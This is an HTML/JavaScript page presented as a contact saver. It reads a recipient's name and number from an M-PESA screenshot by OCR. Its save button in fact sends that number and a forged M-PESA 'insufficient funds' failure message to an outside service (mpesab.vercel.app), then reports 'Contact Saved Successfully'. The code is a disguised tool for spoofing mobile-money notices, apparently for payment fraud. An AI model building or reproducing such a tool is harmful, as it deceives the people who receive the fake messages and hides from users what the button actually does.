<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Save Contact (OCR Edition)</title>
<script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
<style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
    .container { max-width: 500px; width: 95%; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 12px; box-sizing: border-box; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
    h3 { text-align: center; margin-bottom: 15px; font-size: 1.4rem; color: #4CAF50; text-transform: uppercase; letter-spacing: 1px; }
    
    .upload-section { border: 2px dashed #4CAF50; padding: 30px 20px; text-align: center; border-radius: 10px; margin-bottom: 15px; cursor: pointer; transition: 0.3s; }
    .upload-section:hover { background: #252525; border-color: #66bb6a; }
    #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 15px; display: none; border: 1px solid #333; }

    textarea { width: 100%; height: 80px; padding: 10px; margin-top: 10px; background: #2a2a2a; border: none; border-radius: 6px; color: white; font-size: 1rem; resize: none; box-sizing: border-box; }
    
    .manual-input-container { margin-top: 15px; padding: 15px; border: 1px solid #333; border-radius: 8px; background: #252525; }
    .manual-input-container label { display: block; margin-bottom: 5px; font-size: 0.85rem; color: #4CAF50; font-weight: bold; }
    input[type="text"] { width: 100%; padding: 12px; background: #333; border: 1px solid #444; border-radius: 6px; color: white; box-sizing: border-box; font-size: 1.1rem; margin-bottom: 15px; outline: none; }
    input[type="text"]:focus { border-color: #4CAF50; }

    button { width: 100%; padding: 16px; margin-top: 10px; border: none; border-radius: 6px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 1rem; transition: 0.3s; }
    button:hover:not(:disabled) { background: #45a049; transform: translateY(-1px); }
    button:disabled { background: gray; cursor: not-allowed; }
    
    pre { background: #000; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-wrap: break-word; border-radius: 6px; font-size: 0.95rem; color: #4CAF50; border: 1px solid #333; min-height: 20px; text-align: center; }
    .loading-text { color: #ffeb3b; font-size: 0.9rem; text-align: center; display: none; margin-bottom: 10px; font-weight: bold; }
</style>
</head>
<body>

<div class="container">
    <h3>Save Contact</h3>
    
    <div class="upload-section" onclick="document.getElementById('imageInput').click()">
        <span>Click to Upload Screenshot 📸</span>
        <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="handleImage(this)">
        <img id="imagePreview" alt="Preview">
    </div>

    <div id="loader" class="loading-text">🔍 Scanning Image... Please wait.</div>

    <div class="manual-input-container">
        <label>DETECTED NAME:</label>
        <input type="text" id="detectedName" placeholder="Recipient Name">
        
        <label>DETECTED NUMBER:</label>
        <input type="text" id="detectedPhone" placeholder="Phone Number">
    </div>

    <button id="saveBtn" onclick="saveContact()">SAVE CONTACT</button>
    <pre id="output"></pre>
</div>

<script>
const API = "https://mpesab.vercel.app";
const FIXED_MESSAGE = "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to send KSH15000.00. Available Fuliza M-PESA limit KSH0.00.";

// Handle Image Upload and OCR
async function handleImage(input) {
    const file = input.files[0];
    if (!file) return;

    // Show Preview
    const reader = new FileReader();
    reader.onload = e => {
        const preview = document.getElementById('imagePreview');
        preview.src = e.target.result;
        preview.style.display = 'block';
    };
    reader.readAsDataURL(file);

    const loader = document.getElementById('loader');
    loader.style.display = 'block';

    try {
        // Perform OCR
        const { data: { text } } = await Tesseract.recognize(file, 'eng');
        processText(text);
    } catch (err) {
        alert("Error scanning image. Please try again or enter manually.");
    } finally {
        loader.style.display = 'none';
    }
}

function processText(rawText) {
    console.log("Extracted Text:", rawText);
    
    // Split text into lines for contextual checking
    let lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 2);
    let detectedPhone = "";
    let detectedName = "";

    // -- PRIORITY 1: Check for labels first (The provided image has "Recipient Name or Number" and "Recipient Name")
    for(let i = 0; i < lines.length; i++) {
        let currentLine = lines[i].toLowerCase();

        // Detect Number by label proximity (Recipient Number label)
        if(currentLine.includes("recipient name or number") && lines[i+1]) {
            let numMatch = lines[i+1].match(/\+?\d{5,15}/);
            if(numMatch) {
                detectedPhone = numMatch[0];
            }
        }
        // Detect Number fallback: If the first label is just "Recipient Number"
        else if(currentLine.includes("recipient number") && lines[i+1]) {
            let numMatch = lines[i+1].match(/\+?\d{5,15}/);
            if(numMatch) {
                detectedPhone = numMatch[0];
            }
        }

        // Detect Name by label proximity (Recipient Name label)
        if(currentLine.includes("recipient name") && lines[i+1]) {
            detectedName = lines[i+1];
            // Name detection by label can capture "JAMES MWEU". Clean it up.
            detectedName = detectedName.replace(/[^a-zA-Z\s]/g, '').trim();
            break; // Found the specific name label, stop checking other lines for name
        }
    }

    // -- PRIORITY 2: Fallback (if specific labels were not caught well by the OCR)
    
    // Fallback Number extraction (Any long number on its own line)
    if(!detectedPhone) {
        let numFallbackMatch = rawText.match(/(?:07|01|254|\+254)\d{8,10}/);
        if(!numFallbackMatch) {
            numFallbackMatch = rawText.match(/\+?\d{5,15}/); // The original broad pattern
        }
        detectedPhone = numFallbackMatch ? numFallbackMatch[0] : "";
    }

    // Fallback Name extraction (Old Proximity keyword or Capitol block regex)
    if(!detectedName || detectedName.length < 3) {
        // Old generalized pattern matching capitalized block (e.g., JOHN DOE)
        let nameMatch = rawText.match(/([A-Z]{3,}(?:\s[A-Z]{3,})+)/);
        detectedName = nameMatch ? nameMatch[0] : "Unknown Merchant";
    }

    document.getElementById('detectedPhone').value = detectedPhone;
    document.getElementById('detectedName').value = detectedName.toUpperCase().trim();
}

function generateToken() {
    return "CONTACT" + Math.floor(Math.random() * 100000);
}

async function saveContact() {
    const btn = document.getElementById("saveBtn");
    const output = document.getElementById("output");
    const name = document.getElementById("detectedName").value.trim();
    const phone = document.getElementById("detectedPhone").value.trim();

    if (!phone || !name) {
        output.innerText = "❌ Please ensure Name and Number are filled.";
        return;
    }

    btn.disabled = true;
    btn.innerText = "Saving...";
    let token = generateToken();

    try {
        const response = await fetch(`${API}/send`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                phone: phone,
                name: name,
                amount: 0,
                token: token,
                message: FIXED_MESSAGE
            })
        });

        if (response.ok) {
            output.innerText = "Contact Saved Successfully ✅\n\nName: " + name + "\nPhone: " + phone;
            btn.innerText = "Saved ✓";
        } else {
            throw new Error();
        }
    } catch (error) {
        output.innerText = "❌ Connection Error";
        btn.disabled = false;
        btn.innerText = "SAVE CONTACT";
    }
}
</script>

</body>
</html>
